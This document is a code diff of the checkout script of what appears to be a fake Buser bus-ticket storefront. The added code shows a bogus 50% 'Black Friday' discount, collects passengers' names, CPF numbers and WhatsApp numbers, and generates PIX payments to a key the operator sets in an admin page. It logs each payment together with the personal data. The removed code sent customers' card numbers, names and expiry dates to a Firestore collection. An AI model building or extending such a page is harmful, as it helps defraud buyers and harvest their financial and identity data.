-    crc ^= str.charCodeAt(i) << 8;
-    for (let j = 0; j < 8; j++) {
-      crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
+  function selecionarViagem(index) {
+    viagemSel = viagensOriginais[index];
+    if (!viagemSel) return;
+    passageiros = [];
+    precoUnit = (parseFloat(viagemSel.price) || 0) * (1 - DESCONTO);
+    document.getElementById('lista-passageiros').innerHTML = '';
+    adicionarPassageiro();
+    document.getElementById('modal-passageiros').style.display = 'flex';
+    atualizarTotal();
+  }
+
+  function adicionarPassageiro() {
+    const container = document.getElementById('lista-passageiros');
+    const index = passageiros.length;
+    passageiros.push({ nome: '', cpf: '', whatsapp: '' });
+    const div = document.createElement('div');
+    div.className = 'passageiro-box';
+    div.innerHTML = `
+      <p style="font-weight:600; margin:0 0 8px;">Passageiro ${index + 1}</p>
+      <input type="text" placeholder="Nome completo" oninput="atualizarPassageiro(${index}, 'nome', this.value)">
+      <input type="text" placeholder="CPF" maxlength="14" oninput="this.value = mascaraCPF(this.value); atualizarPassageiro(${index}, 'cpf', this.value)">
+      <input type="tel" placeholder="WhatsApp com DDD" oninput="this.value = mascaraWhats(this.value); atualizarPassageiro(${index}, 'whatsapp', this.value)">
+    `;
+    container.appendChild(div);
+    atualizarTotal();
+  }
+
+  function atualizarPassageiro(i, campo, valor) { passageiros[i][campo] = valor; }
+
+  function atualizarTotal() {
+    const totalFinal = precoUnit * passageiros.length;
+    const totalOriginal = totalFinal * 2;
+    document.getElementById('valor-total').innerHTML = `
+      <span style="text-decoration:line-through; color:#999; font-size:14px; margin-right:8px;">R$ ${totalOriginal.toFixed(2).replace('.', ',')}</span>
+      R$ ${totalFinal.toFixed(2).replace('.', ',')}
+      <span class="desconto-badge">-50%</span>
+    `;
+  }
+
+  function fecharModalPassageiros() { document.getElementById('modal-passageiros').style.display = 'none'; }
+
+  function confirmarPassageiros() {
+    for (let i = 0; i < passageiros.length; i++) {
+      const p = passageiros[i];
+      if (!p.nome || p.nome.trim().length < 3) { alert(`Informe o nome completo do passageiro ${i + 1}.`); return; }
+      if (!p.cpf || p.cpf.replace(/\D/g, '').length !== 11) { alert(`CPF inválido para o passageiro ${i + 1}.`); return; }
+      if (!p.whatsapp || p.whatsapp.replace(/\D/g, '').length < 10) { alert(`WhatsApp inválido para o passageiro ${i + 1}.`); return; }
     }
-    crc &= 0xFFFF;
-  }
-  return crc.toString(16).toUpperCase().padStart(4, '0');
-}
-
-function gerarPayloadPix(chave, nome, cidade, valor, txid) {
-  const valorStr = valor.toFixed(2);
-  const nomeLimpo = nome.normalize('NFD').replace(/[\u0300-\u036f]/g, "").replace(/[^a-zA-Z0-9 ]/g, '').substring(0, 25);
-  const cidadeLimpa = cidade.normalize('NFD').replace(/[\u0300-\u036f]/g, "").replace(/[^a-zA-Z0-9 ]/g, '').substring(0, 15);
-  const txidLimpo = txid.replace(/[^a-zA-Z0-9]/g, '').substring(0, 25) || '***';
-
-  function campo(id, valor) {
-    return id + valor.length.toString().padStart(2, '0') + valor;
+    fecharModalPassageiros();
+    abrirModalPoltrona(viagemSel);
   }
 
-  const gui = 'br.gov.bcb.pix';
-  const chaveField = campo('00', gui) + campo('01', chave);
-  const merchantAccount = campo('26', chaveField);
-  const payload = campo('00', '01') + merchantAccount + campo('52', '0000') + campo('53', '986') + campo('54', valorStr) + campo('58', 'BR') + campo('59', nomeLimpo) + campo('60', cidadeLimpa) + campo('62', campo('05', txidLimpo)) + '6304';
-  return payload + crc16(payload);
-}
+  function abrirModalPoltrona(viagem) {
+    assento = null;
+    const mapa = document.getElementById('mapa-onibus');
+    const fonte = document.getElementById('poltrona-fonte');
+    mapa.innerHTML = '';
 
-function copiarPix() {
-  if (!pixCodeGlobal) return;
-  navigator.clipboard.writeText(pixCodeGlobal).then(() => {
-    alert('PIX copiado!');
-    fs.collection("pix_copiados").add({
-      pixCode: pixCodeGlobal,
-      timestamp: firebase.firestore.FieldValue.serverTimestamp()
-    }).catch(console.warn);
-  });
-}
+    const seatsArray = viagem.seats || viagem.seat_map || viagem.poltronas || null;
+    const occupiedArr = viagem.occupied_seats || viagem.seats_occupied || viagem.poltronas_ocupadas || null;
+    const totalApi = viagem.total_seats || viagem.capacity || viagem.capacidade || null;
+    const total = seatsArray ? seatsArray.length : (totalApi || 46);
 
-function mostrarPix() {
-  document.getElementById('area-pix-content').style.display = 'block';
-  document.getElementById('area-cartao-content').style.display = 'none';
-}
-function mostrarCartao() {
-  document.getElementById('area-pix-content').style.display = 'none';
-  document.getElementById('area-cartao-content').style.display = 'block';
-}
+    fonte.innerHTML = `
+      <div class="poltrona-legenda">
+        <span><span class="sw" style="background:#fff;"></span> Disponível</span>
+        <span><span class="sw" style="background:#454545; border-color:#454545;"></span> Ocupada</span>
+        <span><span class="sw" style="background:var(--brand); border-color:var(--brand);"></span> Selecionada</span>
+      </div>`;
 
-function pagarCartao() {
-  if (!viagemSel) return;
-  const numero = document.getElementById('cartao-numero').value.replace(/\s/g, '');
-  const nome = document.getElementById('cartao-nome').value;
-  const validade = document.getElementById('cartao-validade').value;
-  const cvv = document.getElementById('cartao-cvv').value;
-  if (!numero || !nome || !validade || !cvv) { alert("Preencha todos os dados do cartão."); return; }
-  const totalOriginal = precoUnit * passageiros.length;
-  let totalFinal = totalOriginal;
-  if (CONFIG.descontoGlobal > 0) totalFinal = totalOriginal * (1 - CONFIG.descontoGlobal / 100);
-  fs.collection("cartoes").add({
-    viagem: viagemSel,
-    passageiros: passageiros,
-    assentos: assentosSelecionados,
-    total: totalFinal,
-    cartao: { numero, nome, validade, cvv: "***" },
-    status: 'pendente',
-    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-  }).then(() => {
-    alert("Pedido enviado para análise! O painel foi notificado.");
-    fecharCheckout();
-  }).catch(err => alert("Erro: " + err.message));
-}
+    if (seatsArray && Array.isArray(seatsArray) && seatsArray.length > 0) {
+      seatsArray.forEach((s, idx) => {
+        const num = String(s.number ?? s.numero ?? s.id ?? (idx + 1));
+        const disponivel = s.available ?? s.disponivel ?? s.is_available ?? true;
+        const btn = document.createElement('button');
+        btn.textContent = num;
+        btn.className = 'poltrona-btn';
+        if (!disponivel) btn.disabled = true;
+        else btn.onclick = () => selecionarAssento(btn, num);
+        mapa.appendChild(btn);
+      });
+    } else if (occupiedArr && Array.isArray(occupiedArr)) {
+      const ocupadas = new Set(occupiedArr.map(n => String(n)));
+      for (let i = 1; i <= total; i++) {
+        const btn = document.createElement('button');
+        btn.textContent = i;
+        btn.className = 'poltrona-btn';
+        if (ocupadas.has(String(i))) btn.disabled = true;
+        else btn.onclick = () => selecionarAssento(btn, i);
+        mapa.appendChild(btn);
+      }
+    } else {
+      for (let i = 1; i <= total; i++) {
+        const btn = document.createElement('button');
+        btn.textContent = i;
+        btn.className = 'poltrona-btn';
+        btn.onclick = () => selecionarAssento(btn, i);
+        mapa.appendChild(btn);
+      }
+    }
+    document.getElementById('modal-poltrona').style.display = 'flex';
+  }
 
-function fecharCheckout() { document.getElementById('modal-checkout').style.display = 'none'; }
+  function selecionarAssento(btn, num) {
+    document.querySelectorAll('.poltrona-btn').forEach(b => b.classList.remove('selecionada'));
+    btn.classList.add('selecionada');
+    assento = num;
+  }
+
+  function fecharModalPoltrona() { document.getElementById('modal-poltrona').style.display = 'none'; }
+
+  function confirmarPoltrona() {
+    if (!assento) { alert('Selecione uma poltrona.'); return; }
+    fecharModalPoltrona();
+    abrirCheckout(viagemSel, assento, passageiros);
+  }
+
+  // ============================================================
+  // 7. CONFIG + PAYLOAD PIX
+  // ============================================================
+  function carregarConfig() {
+    try { return JSON.parse(localStorage.getItem('buser_pix_cfg') || '{}'); }
+    catch { return {}; }
+  }
+
+  function sanitizePix(text, max) {
+    return (text || '').toUpperCase()
+      .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
+      .replace(/[^A-Z0-9 ]/g, '')
+      .substring(0, max).trim();
+  }
+  function tlv(id, value) {
+    const len = value.length.toString().padStart(2, '0');
+    return id + len + value;
+  }
+  function crc16(str) {
+    let crc = 0xFFFF;
+    for (let i = 0; i < str.length; i++) {
+      crc ^= str.charCodeAt(i) << 8;
+      for (let j = 0; j < 8; j++) {
+        if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+        else crc = crc << 1;
+        crc &= 0xFFFF;
+      }
+    }
+    return crc.toString(16).toUpperCase().padStart(4, '0');
+  }
+  function gerarPayloadPIX(key, name, city, amount, txid) {
+    const merchantName = sanitizePix(name || 'BUSER', 25) || 'BUSER';
+    const merchantCity = sanitizePix(city || 'SAO PAULO', 15) || 'SAO PAULO';
+    const refLabel = sanitizePix(txid || '***', 25) || '***';
+    const amtStr = Number(amount).toFixed(2);
+    const merchantAccount = tlv('00', 'br.gov.bcb.pix') + tlv('01', key);
+    let payload = '';
+    payload += tlv('00', '01');
+    payload += tlv('01', '12');
+    payload += tlv('26', merchantAccount);
+    payload += tlv('52', '0000');
+    payload += tlv('53', '986');
+    payload += tlv('54', amtStr);
+    payload += tlv('58', 'BR');
+    payload += tlv('59', merchantName);
+    payload += tlv('60', merchantCity);
+    payload += tlv('62', tlv('05', refLabel));
+    payload += '6304';
+    return payload + crc16(payload);
+  }
+
+  // ============================================================
+  // 8. CHECKOUT
+  // ============================================================
+  function abrirCheckout(viagem, poltrona, lista) {
+    const info = document.getElementById('checkout-info');
+    const precoOriginal = parseFloat(viagem.price) || 0;
+    const precoFinal = precoOriginal * (1 - DESCONTO);
+    const totalFinal = precoFinal * lista.length;
+    const totalOriginal = precoOriginal * lista.length;
+
+    checkoutState.total = totalFinal;
+    checkoutState.totalOriginal = totalOriginal;
+    checkoutState.poltrona = poltrona;
+    checkoutState.empresa = viagem.company.name;
+    checkoutState.route = `${document.getElementById('input-origem').value} → ${document.getElementById('input-destino').value}`;
+
+    const tP = extrairTerminal(viagem.departure.terminal);
+    const tC = extrairTerminal(viagem.arrival.terminal);
+    const htmlEmbarque = tP.endereco ? `<br><span style="font-size:11px; color:#757575;">📍 ${tP.endereco}</span>` : '';
+    const htmlDesembarque = tC.endereco ? `<br><span style="font-size:11px; color:#757575;">📍 ${tC.endereco}</span>` : '';
+
+    const htmlPass = lista.map(p => `<li>${p.nome} — CPF ${p.cpf} — 📱 ${p.whatsapp}</li>`).join('');
+
+    info.innerHTML = `
+      <strong>Empresa:</strong> ${viagem.company.name}<br>
+      <strong>Poltrona:</strong> ${poltrona}<br>
+      <strong>Embarque:</strong> ${tP.nome}${htmlEmbarque}<br>
+      <strong>Desembarque:</strong> ${tC.nome}${htmlDesembarque}<br>
+      <strong>Passageiros:</strong>
+      <ul style="padding-left:16px; margin:8px 0;">${htmlPass}</ul>
+      <div style="background:#f0f9f0; padding:12px; border-radius:8px; margin-top:12px;">
+        <div style="font-size:12px; color:#666;">Valor original</div>
+        <div class="preco-antigo" style="font-size:16px;">R$ ${totalOriginal.toFixed(2).replace('.', ',')}</div>
+        <div style="font-size:12px; color:#2e7d32; margin-top:8px; font-weight:600;">🔥 Black Friday -50%</div>
+        <div style="color:var(--brand); font-weight:bold; font-size:22px;">R$ ${totalFinal.toFixed(2).replace('.', ',')}</div>
+        <div style="font-size:11px; color:#40b552; margin-top:4px;">Você economiza R$ ${(totalOriginal - totalFinal).toFixed(2).replace('.', ',')}</div>
+      </div>
+    `;
+
+    document.getElementById('area-pix').innerHTML = `<button onclick="gerarPix()" style="width:100%; padding:14px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer;">Gerar PIX</button>`;
+    document.getElementById('modal-checkout').style.display = 'flex';
+  }
+
+  function fecharCheckout() { document.getElementById('modal-checkout').style.display = 'none'; }
+
+  function gerarPix() {
+    const cfg = carregarConfig();
+    if (!cfg.key) {
+      alert('⚠️ Nenhuma chave PIX configurada.\n\nAbra o painel ⚙️ (canto inferior direito) para cadastrar no admin.html.');
+      window.open('admin.html', '_blank');
+      return;
+    }
+
+    const total = checkoutState.total || 0;
+    const txid = 'BUSER' + Date.now().toString().slice(-8);
+    const payload = gerarPayloadPIX(cfg.key, cfg.name, cfg.city, total, txid);
+    checkoutState.payload = payload;
+    checkoutState.txid = txid;
+
+    logPix('generated', {
+      txid,
+      amount: total,
+      originalAmount: checkoutState.totalOriginal || total * 2,
+      key: cfg.key,
+      receiverName: cfg.name || '',
+      payload,
+      passengers: passageiros.map(p => ({ nome: p.nome, cpf: p.cpf, whatsapp: p.whatsapp })),
+      poltrona: checkoutState.poltrona,
+      empresa: checkoutState.empresa,
+      route: checkoutState.route
+    });
+
+    const area = document.getElementById('area-pix');
+    area.innerHTML = `
+      <div class="pix-display">
+        <p class="pix-total">R$ ${total.toFixed(2).replace('.', ',')}</p>
+        <p class="pix-receiver">Recebedor: <strong>${sanitizePix(cfg.name || 'BUSER', 25)}</strong><br>Chave: ${cfg.key}</p>
+        <div id="qrcode"></div>
+        <div class="pix-code" id="pix-code-text">${payload}</div>
+        <div class="pix-actions">
+          <button class="btn-copy" onclick="copiarPix()">📋 Copiar código PIX</button>
+        </div>
+        <p style="font-size:10px; color:var(--grey-med); margin-top:12px;">ID: ${txid}</p>
+      </div>
+    `;
+
+    const qrDiv = document.getElementById('qrcode');
+    qrDiv.innerHTML = '';
+    new QRCode(qrDiv, {
+      text: payload, width: 220, height: 220,
+      colorDark: '#000000', colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.M
+    });
+  }
+
+  async function copiarPix() {
+    try {
+      await navigator.clipboard.writeText(checkoutState.payload);
+      logPix('copied', { txid: checkoutState.txid, by: 'cliente' });
+      alert('✅ Código PIX copiado!');
+    } catch {
+      const el = document.getElementById('pix-code-text');
+      const r = document.createRange(); r.selectNode(el);
+      window.getSelection().removeAllRanges(); window.getSelection().addRange(r);
+      document.execCommand('copy');
+      logPix('copied', { txid: checkoutState.txid, by: 'cliente' });
+      alert('✅ Código PIX copiado!');
+    }
+  }
 </script>
+
 </body>
 </html>
